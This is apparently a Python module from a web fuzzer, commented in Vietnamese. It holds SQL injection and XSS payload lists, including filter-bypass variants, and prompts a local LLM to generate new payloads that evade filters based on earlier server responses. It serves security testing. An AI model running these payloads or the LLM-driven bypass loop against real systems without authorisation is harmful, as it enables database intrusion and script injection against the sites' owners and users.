# =============================================================================
# fuzzer/payload_planner.py — Payload DB + AI adaptive refinement
#
# Vai trò AI trong module này:
#   1. Đoán backend database (MSSQL/MySQL) → chọn payload set đúng
#   2. Đoán XSS context (html_body/attribute/js) → chọn payload đúng
#   3. [Adaptive] Đọc response vòng trước → sinh payload mới bypass filter
#
# Khi AI không khả dụng → fallback hoàn toàn sang payload cứng.
# Không có bước nào bắt buộc AI — mọi bước đều có fallback.
# =============================================================================

import json
import logging

from llm.ollama_client import call_json, is_alive

log = logging.getLogger(__name__)

MAX_ROUNDS   = 3   # Số vòng adaptive tối đa
MIN_NEW_PAYLOADS = 2   # Dừng refine nếu AI sinh < 2 payload mới


# =============================================================================
# PAYLOAD DATABASE — phân loại theo technique + backend
# =============================================================================

SQLI_PAYLOADS = {
    "error_mssql": [
        "' OR '1'='1", "' OR '1'='1'--",
        "'; SELECT @@version--",
        "1' AND 1=CONVERT(int,@@version)--",
        "' UNION SELECT NULL,@@version--",
        "' OR 1=1--", "admin'--", "' OR ''='",
    ],
    "error_mysql": [
        "' OR '1'='1", "' OR '1'='1'#",
        "' UNION SELECT NULL,version()#",
        "1' AND extractvalue(1,concat(0x7e,version()))#",
        "' OR 1=1#",
    ],
    "error_generic": [
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "' UNION SELECT NULL--",
        "1 OR 1=1", "' OR 'x'='x",
    ],
    "time_mssql": [
        "'; WAITFOR DELAY '0:0:4'--",
        "1; WAITFOR DELAY '0:0:4'--",
        "' IF(1=1) WAITFOR DELAY '0:0:4'--",
    ],
    "time_mysql": [
        "' AND SLEEP(4)--", "1' AND SLEEP(4)#", "' OR SLEEP(4)#",
    ],
    "time_generic": [
        "'; WAITFOR DELAY '0:0:4'--",
        "' AND SLEEP(4)--",
    ],
    "boolean": [
        ("' AND 1=1--",  "' AND 1=2--"),
        ("' OR 1=1--",   "' OR 1=2--"),
        ("1 AND 1=1",    "1 AND 1=2"),
        ("' AND 'a'='a", "' AND 'a'='b"),
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL--",
    ],
}

XSS_PAYLOADS = {
    "html_body": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "html_attribute": [
        '"><script>alert(1)</script>',
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '" autofocus onfocus="alert(1)',
    ],
    "js_context": [
        "';alert(1)//", '";alert(1)//',
        "</script><script>alert(1)</script>",
    ],
    "bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<svg/onload=alert(1)>",
        "<img src=1 onerror=alert(1)>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        '"><img src=x onerror=alert(1)>',
    ],
}


# =============================================================================
# ENTRY POINT — Sinh plan vòng đầu
# =============================================================================

def generate_plan(endpoints: list) -> dict:
    """
    Sinh payload plan vòng đầu cho tất cả endpoint high/medium.

    AI tham gia (nếu online):
      - Đoán backend → chọn payload SQLi đúng (mssql/mysql/generic)
      - Đoán XSS context → chọn payload đúng ngữ cảnh

    Nếu AI offline → fallback generic hoàn toàn.

    Returns:
        {ep_id: {"sqli": {...}, "xss": [...]}}
    """
    ai_online = is_alive()
    if not ai_online:
        log.warning("[planner] Ollama offline → dùng payload cứng generic")
    else:
        log.info("[planner] Ollama online → AI hỗ trợ chọn payload")

    targets = [ep for ep in endpoints if ep.risk_level in ("high", "medium")]
    if not targets:
        log.warning("[planner] Không có endpoint cần plan")
        return {}

    plan = {}
    for ep in targets:
        ep_plan = {}

        if "sqli" in ep.likely_vulns:
            backend = _detect_backend(ep, use_ai=ai_online)
            ep_plan["sqli"] = _sqli_payloads_for(backend)
            log.info(f"[planner] {ep.id} SQLi → backend={backend}")

        if "xss" in ep.likely_vulns:
            context = _detect_xss_context(ep, use_ai=ai_online)
            ep_plan["xss"] = _xss_payloads_for(context)
            log.info(f"[planner] {ep.id} XSS → context={context}")

        if ep_plan:
            plan[ep.id] = ep_plan

    log.info(f"[planner] Plan vòng 1 cho {len(plan)} endpoints")
    return plan


# =============================================================================
# ADAPTIVE REFINEMENT — Sinh payload mới dựa trên response vòng trước
# =============================================================================

def refine_plan(ep, prev_logs: list[dict], round_num: int) -> dict:
    """
    Đọc log response vòng trước → AI sinh payload mới để bypass filter.

    Chỉ gọi khi:
      - Chưa tìm được is_vulnerable=True rõ ràng
      - Còn trong phạm vi MAX_ROUNDS

    Args:
        ep:        Endpoint đang test
        prev_logs: Log từ vòng fuzz trước (chỉ những log "có signal")
        round_num: Số thứ tự vòng hiện tại (bắt đầu từ 2)

    Returns:
        {"sqli": [...], "xss": [...]}  — chỉ payload MỚI (đã dedup)
        {}  nếu AI không sinh được gì mới
    """
    if not is_alive():
        log.warning(f"[planner] Vòng {round_num}: Ollama offline → dừng refine")
        return {}

    # Lọc chỉ log có "signal" để gửi cho AI (tránh gửi log vô nghĩa)
    signal_logs = _filter_signal_logs(prev_logs)
    if not signal_logs:
        log.info(f"[planner] Vòng {round_num}: không có log signal → dừng refine")
        return {}

    log.info(f"[planner] Vòng {round_num}: {len(signal_logs)} signal logs → AI refine")

    new_plan = {}

    # Refine SQLi
    sqli_logs = [l for l in signal_logs if l.get("vuln_type") == "sqli"]
    if sqli_logs:
        new_sqli = _ai_refine_sqli(ep, sqli_logs, round_num)
        if new_sqli:
            new_plan["sqli"] = new_sqli

    # Refine XSS
    xss_logs = [l for l in signal_logs if l.get("vuln_type") == "xss"]
    if xss_logs:
        new_xss = _ai_refine_xss(ep, xss_logs, round_num)
        if new_xss:
            new_plan["xss"] = new_xss

    return new_plan


def _ai_refine_sqli(ep, signal_logs: list[dict], round_num: int) -> list[str]:
    """AI phân tích response SQLi → sinh payload mới bypass filter."""
    slim = [
        {
            "payload": l["payload"],
            "status":  l["response"]["status"],
            "snippet": l["response"].get("body_snippet", "")[:300],
            "technique": l.get("technique", ""),
        }
        for l in signal_logs
    ]

    prompt = f"""Bạn là chuyên gia pentest SQLi. Đây là vòng {round_num} của adaptive fuzzing.

Endpoint: {ep.url} | Params: {ep.params}

Các payload đã thử và response:
{json.dumps(slim, ensure_ascii=False)}

Phân tích:
- Nếu response có SQL error → suy luận loại DB, sinh payload khai thác sâu hơn
- Nếu response encode/block payload → sinh payload bypass filter (comment, case, encoding)
- Nếu status 500 liên tục → thử kỹ thuật khác (time-based, boolean-based)

Sinh tối đa 5 payload MỚI, không trùng payload đã thử.
Trả về JSON array (chỉ strings):
["payload1", "payload2", "payload3"]"""

    result = call_json(prompt)
    if isinstance(result, list) and all(isinstance(p, str) for p in result):
        # Dedup với payload đã dùng
        used = {l["payload"] for l in signal_logs}
        new  = [p for p in result if p not in used]
        log.info(f"[planner] SQLi refine vòng {round_num}: {len(new)} payload mới")
        return new
    return []


def _ai_refine_xss(ep, signal_logs: list[dict], round_num: int) -> list[str]:
    """AI phân tích response XSS → sinh payload mới bypass encode/filter."""
    slim = [
        {
            "payload": l["payload"],
            "status":  l["response"]["status"],
            "snippet": l["response"].get("body_snippet", "")[:300],
        }
        for l in signal_logs
    ]

    prompt = f"""Bạn là chuyên gia pentest XSS. Đây là vòng {round_num} của adaptive fuzzing.

Endpoint: {ep.url} | Params: {ep.params}

Các payload đã thử và response:
{json.dumps(slim, ensure_ascii=False)}

Phân tích:
- Nếu < thành &lt; → app encode HTML → thử payload trong JS context, event attribute
- Nếu script bị block → thử payload không dùng <script> (img, svg, event handler)
- Nếu " bị filter → thử payload không dùng dấu nháy
- Nếu payload phản chiếu một phần → sinh payload phù hợp với context đó

Sinh tối đa 5 payload MỚI có khả năng bypass filter, không trùng payload đã thử.
Trả về JSON array (chỉ strings):
["payload1", "payload2", "payload3"]"""

    result = call_json(prompt)
    if isinstance(result, list) and all(isinstance(p, str) for p in result):
        used = {l["payload"] for l in signal_logs}
        new  = [p for p in result if p not in used]
        log.info(f"[planner] XSS refine vòng {round_num}: {len(new)} payload mới")
        return new
    return []


def _filter_signal_logs(logs: list[dict]) -> list[dict]:
    """
    Lọc log có signal để gửi cho AI refine.
    Signal = có dấu hiệu bất thường nhưng chưa xác nhận rõ ràng.
    """
    signal = []
    for l in logs:
        status    = l["response"].get("status", 200)
        snippet   = l["response"].get("body_snippet", "").lower()
        bl_status = l.get("baseline", {}).get("status", 200)

        has_signal = (
            status != bl_status                              # status thay đổi
            or status in (400, 500)                         # server error
            or any(k in snippet for k in [                  # có từ khóa lỗi
                "error", "syntax", "invalid", "warning",
                "exception", "encode", "&lt;", "blocked"
            ])
        )
        if has_signal:
            signal.append(l)

    return signal


# =============================================================================
# HELPER — Detect backend + chọn payload set
# =============================================================================

def _detect_backend(ep, use_ai: bool = True) -> str:
    """Đoán backend từ URL extension trước, AI bổ sung nếu cần."""
    # Rule-based trước — nhanh và chính xác
    url = ep.url.lower()
    if any(ext in url for ext in [".asp", ".aspx"]):
        return "mssql"
    if any(ext in url for ext in [".php", ".php3"]):
        return "mysql"

    # AI nếu rule không đoán được
    if use_ai:
        prompt = f"""Đoán database backend:
URL: {ep.url}
Response sample: {json.dumps(ep.response_sample)}

Trả về JSON: {{"backend": "mssql|mysql|generic"}}"""
        result = call_json(prompt)
        if isinstance(result, dict) and result.get("backend") in ("mssql", "mysql", "generic"):
            return result["backend"]

    return "generic"


def _sqli_payloads_for(backend: str) -> dict:
    return {
        "error":   SQLI_PAYLOADS.get(f"error_{backend}", SQLI_PAYLOADS["error_generic"]),
        "time":    SQLI_PAYLOADS.get(f"time_{backend}",  SQLI_PAYLOADS["time_generic"]),
        "boolean": SQLI_PAYLOADS["boolean"],
        "union":   SQLI_PAYLOADS["union"],
    }


def _detect_xss_context(ep, use_ai: bool = True) -> str:
    """Đoán XSS context từ response snippet, AI hỗ trợ nếu cần."""
    snippet = ep.response_sample.get("body_snippet", "").lower()

    # Rule-based: tìm dấu hiệu trong snippet
    if 'value="' in snippet or "value='" in snippet:
        return "html_attribute"
    if "var " in snippet or "function(" in snippet or '= "' in snippet:
        return "js_context"

    # AI nếu rule không rõ
    if use_ai and snippet:
        prompt = f"""Đoán XSS reflection context:
Snippet: {snippet[:200]}

Trả về JSON: {{"context": "html_body|html_attribute|js_context"}}"""
        result = call_json(prompt)
        if isinstance(result, dict) and result.get("context") in (
                "html_body", "html_attribute", "js_context"):
            return result["context"]

    return "html_body"


def _xss_payloads_for(context: str) -> list:
    """Gộp payload theo context + bypass, dedup."""
    base   = XSS_PAYLOADS.get(context, XSS_PAYLOADS["html_body"])
    bypass = XSS_PAYLOADS["bypass"]
    seen, result = set(), []
    for p in base + bypass:
        if p not in seen:
            seen.add(p)
            result.append(p)
    return result